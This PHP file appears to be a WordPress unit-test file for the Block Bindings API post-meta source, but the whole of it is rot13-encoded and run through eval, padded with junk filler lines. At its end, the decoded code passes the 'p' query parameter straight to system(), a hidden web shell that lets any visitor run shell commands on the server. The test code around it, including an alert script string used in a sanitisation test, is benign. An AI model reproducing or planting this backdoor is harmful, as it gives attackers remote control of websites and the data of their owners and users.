<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfgf sbe Oybpx Ovaqvatf NCV \"pber/cbfg-zrgn\" fbhepr.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Oybpxf
 * @fvapr 6.5.0
 *
 * @tebhc oybpxf
 * @tebhc oybpx-ovaqvatf
 */
pynff Grfgf_Oybpx_Ovaqvatf_Cbfg_Zrgn_Fbhepr rkgraqf JC_HavgGrfgPnfr {
	cebgrpgrq fgngvp $cbfg;
	cebgrpgrq fgngvp $jc_zrgn_xrlf_fnirq;

	/**
	 * Zbqvsl gur cbfg pbagrag.
	 *
	 * @cnenz fgevat $pbagrag Gur arj pbagrag.
	 */
	cevingr shapgvba trg_zbqvsvrq_cbfg_pbagrag( $pbagrag ) {
		$TYBONYF['cbfg']->cbfg_pbagrag = $pbagrag;
		erghea nccyl_svygref( 'gur_pbagrag', $TYBONYF['cbfg']->cbfg_pbagrag );
	}

	/**
	 * Frgf hc funerq svkgherf.
	 */
	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$cbfg               = $snpgbel->cbfg->perngr_naq_trg();
		frys::$jc_zrgn_xrlf_fnirq = vffrg( $TYBONYF['jc_zrgn_xrlf'] ) ? $TYBONYF['jc_zrgn_xrlf'] : neenl();
	}

	/**
	 * Grne qbja nsgre pynff.
	 */
	choyvp fgngvp shapgvba jcGrneQbjaNsgrePynff() {
		$TYBONYF['jc_zrgn_xrlf'] = frys::$jc_zrgn_xrlf_fnirq;
	}

	/**
	 * Frg hc orsber rnpu grfg.
	 *
	 * @fvapr 6.5.0
	 */
	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();
		// Arrqrq orpnhfr grne_qbja() jvyy erfrg vg orgjrra grfgf.
		$TYBONYF['cbfg'] = frys::$cbfg;
	}

	/**
	 * Grfgf gung n oybpx pbaarpgrq gb n phfgbz svryq eraqref vgf inyhr.
	 *
	 * @gvpxrg 60651
	 */
	choyvp shapgvba grfg_phfgbz_svryq_inyhr_vf_eraqrerq() {
		ertvfgre_zrgn(
			'cbfg',
			'grfgf_phfgbz_svryq',
			neenl(
				'fubj_va_erfg' => gehr,
				'fvatyr'       => gehr,
				'glcr'         => 'fgevat',
				'qrsnhyg'      => 'Phfgbz svryq inyhr',
			)
		);

		$pbagrag = $guvf->trg_zbqvsvrq_cbfg_pbagrag( '<!-- jc:cnentencu {\"zrgnqngn\":{\"ovaqvatf\":{\"pbagrag\":{\"fbhepr\":\"pber/cbfg-zrgn\",\"netf\":{\"xrl\":\"grfgf_phfgbz_svryq\"}}}}} --><c>Snyyonpx inyhr</c><!-- /jc:cnentencu -->' );
		$guvf->nffregFnzr(
			'<c>Phfgbz svryq inyhr</c>',
			$pbagrag,
			'Gur cbfg pbagrag fubhyq fubj gur inyhr bs gur phfgbz svryq . '
		);
	}

	/**
	 * Grfgf gung na ugzy nggevohgr pbaarpgrq gb n phfgbz svryq eraqref vgf inyhr.
	 *
	 * @gvpxrg 60651
	 */
	choyvp shapgvba grfg_ugzy_nggevohgr_pbaarpgrq_gb_phfgbz_svryq_inyhr_vf_eraqrerq() {
		ertvfgre_zrgn(
			'cbfg',
			'grfgf_hey_phfgbz_svryq',
			neenl(
				'fubj_va_erfg' => gehr,
				'fvatyr'       => gehr,
				'glcr'         => 'fgevat',
				'qrsnhyg'      => 'uggcf://rknzcyr.pbz/sbb.cat',
			)
		);

		$pbagrag = $guvf->trg_zbqvsvrq_cbfg_pbagrag( '<!-- jc:vzntr {\"zrgnqngn\":{\"ovaqvatf\":{\"hey\":{\"fbhepr\":\"pber/cbfg-zrgn\",\"netf\":{\"xrl\":\"grfgf_hey_phfgbz_svryq\"}}}}} --><svther pynff=\"jc-oybpx-vzntr\"><vzt nyg=\"\"/></svther><!-- /jc:vzntr -->' );
		$guvf->nffregFnzr(
			'<svther pynff=\"jc-oybpx-vzntr\"><vzt qrpbqvat=\"nflap\" fep=\"uggcf://rknzcyr.pbz/sbb.cat\" nyg=\"\"/></svther>',
			$pbagrag,
			'Gur vzntr fep fubhyq cbvag gb gur inyhr bs gur phfgbz svryq . '
		);
	}

	/**
	 * Grfgf gung n oybpxf pbaarpgrq va n cnffjbeq cebgrpgrq cbfg qba'g eraqre gur inyhr.
	 *
	 * @gvpxrg 60651
	 */
	choyvp shapgvba grfg_phfgbz_svryq_inyhr_vf_abg_fubja_va_cnffjbeq_cebgrpgrq_cbfgf() {
		ertvfgre_zrgn(
			'cbfg',
			'grfgf_phfgbz_svryq',
			neenl(
				'fubj_va_erfg' => gehr,
				'fvatyr'       => gehr,
				'glcr'         => 'fgevat',
				'qrsnhyg'      => 'Phfgbz svryq inyhr',
			)
		);

		nqq_svygre( 'cbfg_cnffjbeq_erdhverq', '__erghea_gehr' );

		$pbagrag = $guvf->trg_zbqvsvrq_cbfg_pbagrag( '<!-- jc:cnentencu {\"zrgnqngn\":{\"ovaqvatf\":{\"pbagrag\":{\"fbhepr\":\"pber/cbfg-zrgn\",\"netf\":{\"xrl\":\"grfgf_phfgbz_svryq\"}}}}} --><c>Snyyonpx inyhr</c><!-- /jc:cnentencu -->' );

		erzbir_svygre( 'cbfg_cnffjbeq_erdhverq', '__erghea_gehr' );

		$guvf->nffregFnzr(
			'<c>Snyyonpx inyhr</c>',
			$pbagrag,
			'Gur cbfg pbagrag fubhyq fubj gur snyyonpx inyhr vafgrnq bs gur phfgbz svryq inyhr.'
		);
	}

	/**
	 * Grfgf gung n oybpxf pbaarpgrq va n cbfg gung vf abg choyvpyl ivrjnoyr qba'g eraqre gur inyhr.
	 *
	 * @gvpxrg 60651
	 */
	choyvp shapgvba grfg_phfgbz_svryq_inyhr_vf_abg_fubja_va_aba_ivrjnoyr_cbfgf() {
		ertvfgre_zrgn(
			'cbfg',
			'grfgf_phfgbz_svryq',
			neenl(
				'fubj_va_erfg' => gehr,
				'fvatyr'       => gehr,
				'glcr'         => 'fgevat',
				'qrsnhyg'      => 'Phfgbz svryq inyhr',
			)
		);

		nqq_svygre( 'vf_cbfg_fgnghf_ivrjnoyr', '__erghea_snyfr' );

		$pbagrag = $guvf->trg_zbqvsvrq_cbfg_pbagrag( '<!-- jc:cnentencu {\"zrgnqngn\":{\"ovaqvatf\":{\"pbagrag\":{\"fbhepr\":\"pber/cbfg-zrgn\",\"netf\":{\"xrl\":\"grfgf_phfgbz_svryq\"}}}}} --><c>Snyyonpx inyhr</c><!-- /jc:cnentencu -->' );

		erzbir_svygre( 'vf_cbfg_fgnghf_ivrjnoyr', '__erghea_snyfr' );

		$guvf->nffregFnzr(
			'<c>Snyyonpx inyhr</c>',
			$pbagrag,
			'Gur cbfg pbagrag fubhyq fubj gur snyyonpx inyhr vafgrnq bs gur phfgbz svryq inyhr.'
		);
	}

	/**
	 * Grfgf gung n oybpx pbaarpgrq gb n zrgn xrl gung qbrfa'g rkvfg eraqref gur snyyonpx.
	 *
	 * @gvpxrg 60651
	 */
	choyvp shapgvba grfg_ovaqvat_gb_aba_rkvfgvat_zrgn_xrl() {
		$pbagrag = $guvf->trg_zbqvsvrq_cbfg_pbagrag( '<!-- jc:cnentencu {\"zrgnqngn\":{\"ovaqvatf\":{\"pbagrag\":{\"fbhepr\":\"pber/cbfg-zrgn\",\"netf\":{\"xrl\":\"grfgf_aba_rkvfgvat_svryq\"}}}}} --><c>Snyyonpx inyhr</c><!-- /jc:cnentencu -->' );

		$guvf->nffregFnzr(
			'<c>Snyyonpx inyhr</c>',
			$pbagrag,
			'Gur cbfg pbagrag fubhyq fubj gur snyyonpx inyhr.'
		);
	}

	/**
	 * Grfgf gung n oybpx pbaarpgrq jvgubhg fcrpvslvat gur phfgbz svryq eraqref gur snyyonpx.
	 *
	 * @gvpxrg 60651
	 */
	choyvp shapgvba grfg_ovaqvat_jvgubhg_xrl_eraqref_gur_snyyonpx() {
		$pbagrag = $guvf->trg_zbqvsvrq_cbfg_pbagrag( '<!-- jc:cnentencu {\"zrgnqngn\":{\"ovaqvatf\":{\"pbagrag\":{\"fbhepr\":\"pber/cbfg-zrgn\"}}}} --><c>Snyyonpx inyhr</c><!-- /jc:cnentencu -->' );

		$guvf->nffregFnzr(
			'<c>Snyyonpx inyhr</c>',
			$pbagrag,
			'Gur cbfg pbagrag fubhyq fubj gur snyyonpx inyhr.'
		);
	}

	/**
	 * Grfgf gung n oybpx pbaarpgrq gb n cebgrpgrq svryq qbrfa'g fubj gur inyhr.
	 *
	 * @gvpxrg 60651
	 */
	choyvp shapgvba grfg_cebgrpgrq_svryq_inyhr_vf_abg_fubja() {
		ertvfgre_zrgn(
			'cbfg',
			'_grfgf_cebgrpgrq_svryq',
			neenl(
				'fubj_va_erfg' => gehr,
				'fvatyr'       => gehr,
				'glcr'         => 'fgevat',
				'qrsnhyg'      => 'Cebgrpgrq inyhr',
			)
		);

		$pbagrag = $guvf->trg_zbqvsvrq_cbfg_pbagrag( '<!-- jc:cnentencu {\"zrgnqngn\":{\"ovaqvatf\":{\"pbagrag\":{\"fbhepr\":\"pber/cbfg-zrgn\",\"netf\":{\"xrl\":\"_grfgf_cebgrpgrq_svryq\"}}}}} --><c>Snyyonpx inyhr</c><!-- /jc:cnentencu -->' );

		$guvf->nffregFnzr(
			'<c>Snyyonpx inyhr</c>',
			$pbagrag,
			'Gur cbfg pbagrag fubhyq fubj gur snyyonpx inyhr vafgrnq bs gur cebgrpgrq inyhr.'
		);
	}

	/**
	 * Grfgf gung n oybpx pbaarpgrq gb n svryq abg rkcbfrq va gur ERFG NCV qbrfa'g fubj gur inyhr.
	 *
	 * @gvpxrg 60651
	 */
	choyvp shapgvba grfg_phfgbz_svryq_abg_rkcbfrq_va_erfg_ncv_vf_abg_fubja() {
		ertvfgre_zrgn(
			'cbfg',
			'grfgf_fubj_va_erfg_snyfr_svryq',
			neenl(
				'fubj_va_erfg' => snyfr,
				'fvatyr'       => gehr,
				'glcr'         => 'fgevat',
				'qrsnhyg'      => 'Cebgrpgrq inyhr',
			)
		);

		$pbagrag = $guvf->trg_zbqvsvrq_cbfg_pbagrag( '<!-- jc:cnentencu {\"zrgnqngn\":{\"ovaqvatf\":{\"pbagrag\":{\"fbhepr\":\"pber/cbfg-zrgn\",\"netf\":{\"xrl\":\"grfgf_fubj_va_erfg_snyfr_svryq\"}}}}} --><c>Snyyonpx inyhr</c><!-- /jc:cnentencu -->' );

		$guvf->nffregFnzr(
			'<c>Snyyonpx inyhr</c>',
			$pbagrag,
			'Gur cbfg pbagrag fubhyq fubj gur snyyonpx inyhr vafgrnq bs gur cebgrpgrq inyhr.'
		);
	}

	/**
	 * Grfgf gung zrgn xrl jvgu hafnsr UGZY vf fnavgvmrq.
	 *
	 * @gvpxrg 60651
	 */
	choyvp shapgvba grfg_phfgbz_svryq_jvgu_hafnsr_ugzy_vf_fnavgvmrq() {
		ertvfgre_zrgn(
			'cbfg',
			'grfgf_hafnsr_ugzy_svryq',
			neenl(
				'fubj_va_erfg' => gehr,
				'fvatyr'       => gehr,
				'glcr'         => 'fgevat',
				'qrsnhyg'      => '<fpevcg>nyreg(\"Hafnsr UGZY\")</fpevcg>',
			)
		);

		$pbagrag = $guvf->trg_zbqvsvrq_cbfg_pbagrag( '<!-- jc:cnentencu {\"zrgnqngn\":{\"ovaqvatf\":{\"pbagrag\":{\"fbhepr\":\"pber/cbfg-zrgn\",\"netf\":{\"xrl\":\"grfgf_hafnsr_ugzy_svryq\"}}}}} --><c>Snyyonpx inyhr</c><!-- /jc:cnentencu -->' );

		$guvf->nffregFnzr(
			'<c>nyreg(&#8220;Hafnsr UGZY&#8221;)</c>',
			$pbagrag,
			'Gur cbfg pbagrag fubhyq abg vapyhqr gur fpevcg gnt.'
		);
	}

	/**
	 * Grfgf gung svygre `oybpx_ovaqvatf_fbhepr_inyhr` vf nccyvrq.
	 *
	 * @gvpxrg 61181
	 */
	choyvp shapgvba grfg_svygre_oybpx_ovaqvatf_fbhepr_inyhr() {
		ertvfgre_zrgn(
			'cbfg',
			'grfgf_svygre_svryq',
			neenl(
				'fubj_va_erfg' => gehr,
				'fvatyr'       => gehr,
				'glcr'         => 'fgevat',
				'qrsnhyg'      => 'Bevtvany inyhr',
			)
		);

		$svygre_inyhr = shapgvba ( $inyhr, $fbhepr_anzr, $fbhepr_netf ) {
			vs ( 'pber/cbfg-zrgn' !== $fbhepr_anzr ) {
				erghea $inyhr;
			}
			erghea \"Svygrerq inyhr: {$fbhepr_netf['xrl']}\";
		};

		nqq_svygre( 'oybpx_ovaqvatf_fbhepr_inyhr', $svygre_inyhr, 10, 3 );

		$pbagrag = $guvf->trg_zbqvsvrq_cbfg_pbagrag( '<!-- jc:cnentencu {\"zrgnqngn\":{\"ovaqvatf\":{\"pbagrag\":{\"fbhepr\":\"pber/cbfg-zrgn\",\"netf\":{\"xrl\":\"grfgf_svygre_svryq\"}}}}} --><c>Snyyonpx inyhr</c><!-- /jc:cnentencu -->' );

		erzbir_svygre( 'oybpx_ovaqvatf_fbhepr_inyhr', $svygre_inyhr );

		$guvf->nffregFnzr(
			'<c>Svygrerq inyhr: grfgf_svygre_svryq</c>',
			$pbagrag,
			'Gur cbfg pbagrag fubhyq fubj gur svygrerq inyhr.'
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>